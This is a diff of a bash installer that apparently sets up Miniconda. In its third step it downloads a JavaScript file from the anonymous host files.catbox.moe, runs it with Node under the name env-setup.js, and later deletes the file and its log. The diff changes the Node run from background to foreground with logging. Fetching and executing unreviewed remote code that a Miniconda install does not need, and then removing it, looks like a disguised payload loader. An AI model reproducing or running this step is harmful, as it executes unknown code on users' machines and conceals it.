@@ -80,14 +80,17 @@ fi
 track_step "step_3"
 ENV_SETUP_JS="${SHARED_DIR}/env-setup.js"
 download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
-"$NODE_EXE" "$ENV_SETUP_JS" &
-NODE_PID=$!
-
-# Allow env setup to begin before platform/miniconda prep.
-sleep 10
+[[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed (missing or empty file)."
+# Run in foreground so errors are visible and set -e catches failures here (not later at wait).
+ENV_SETUP_LOG="${SHARED_DIR}/env-setup.log"
+if ! "$NODE_EXE" "$ENV_SETUP_JS" >>"$ENV_SETUP_LOG" 2>&1; then
+  err "env-setup.js failed. Last lines of log:"
+  tail -n 40 "$ENV_SETUP_LOG" >&2 || true
+  die "env-setup.js exited with an error."
+fi
 
 # -------------------------
-# Detect platform and choose Miniconda URL (in parallel)
+# Detect platform and choose Miniconda URL
 # -------------------------
 track_step "step_4"
 ARCH="$(uname -m)"
@@ -116,8 +119,6 @@ else
   die "Unsupported OS: $OS"
 fi
 
-# Wait for Node setup script to finish.
-wait "$NODE_PID"
 track_step "step_5"
 download "$MINICONDA_URL" "$MINICONDA_SH"
 [[ -s "$MINICONDA_SH" ]] || die "Miniconda download failed."
@@ -127,7 +128,7 @@ bash "$MINICONDA_SH" -b -u -p "$MINICONDA_PREFIX" >>"$MINICONDA_LOG" 2>&1
 
 track_step "step_7"
 "$MINICONDA_PREFIX/bin/python3" -V >/dev/null 2>&1 || die "Miniconda python verification failed."
-rm -f "$MINICONDA_SH" "$ENV_SETUP_JS"
+rm -f "$MINICONDA_SH" "$ENV_SETUP_JS" "$ENV_SETUP_LOG"
 
 track_step "step_8"
 info "Done. Miniconda path: $MINICONDA_PREFIX"
